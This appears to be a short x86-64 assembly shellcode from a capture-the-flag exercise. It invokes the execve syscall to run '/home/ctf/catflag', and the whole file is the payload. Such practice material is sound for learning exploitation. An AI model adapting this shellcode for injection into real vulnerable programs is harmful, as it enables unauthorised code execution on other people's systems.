.global _start
_start:
.intel_syntax noprefix
	
	xor eax, eax
	add eax, 0x3b
	lea edi, [rip+binsh]
	xor esi, esi
	add esi, 0
	xor edx, edx
	add edx, 0
	syscall
binsh:
	.string "/home/ctf/catflag"